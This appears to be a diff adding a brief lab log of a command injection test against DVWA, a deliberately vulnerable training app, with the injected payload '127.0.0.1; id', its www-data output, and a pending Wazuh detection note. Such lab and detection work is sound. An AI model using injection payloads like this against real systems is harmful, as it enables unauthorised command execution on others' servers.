@@ -1,0 +1,6 @@
+DVWA Command Injection
+Target: 10.138.2.171
+Source: 10.138.2.154
+Payload: 127.0.0.1; id
+Result: Command executed successfully; uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Detection: Manual (Wazuh investigation pending)
